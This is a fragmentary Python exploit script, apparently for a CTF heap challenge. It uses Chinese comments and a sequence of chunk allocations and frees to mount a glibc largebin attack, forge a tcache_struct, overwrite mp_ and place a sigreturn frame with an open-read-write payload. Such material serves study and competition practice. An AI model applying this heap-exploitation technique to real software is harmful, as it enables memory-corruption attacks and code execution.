...
while True:
    ...
    try:
        ...
        New(0x440,'FMYY') #15 用于larginbinattack
        New(0x8B0,'\x00'*0x20 + p64(0x21)*8) #16 把unsotbin全申请了
        New(0x430,'FMYY') #17 # 伪造tcache_struct
        New(0x108,'FMYY') #18
        Free(15)
        ######
        ...
        Free(17) # 用于写入mp_
        New(0x800,str(frame) + orw)# 15 put in largebin同时触发largebin attack
        Free(15)
        
        # lg("magic")
        New(0x430,'FMYY')# 15 剩下用于largebinattack的chunk同时写入mp_
        Free(7)
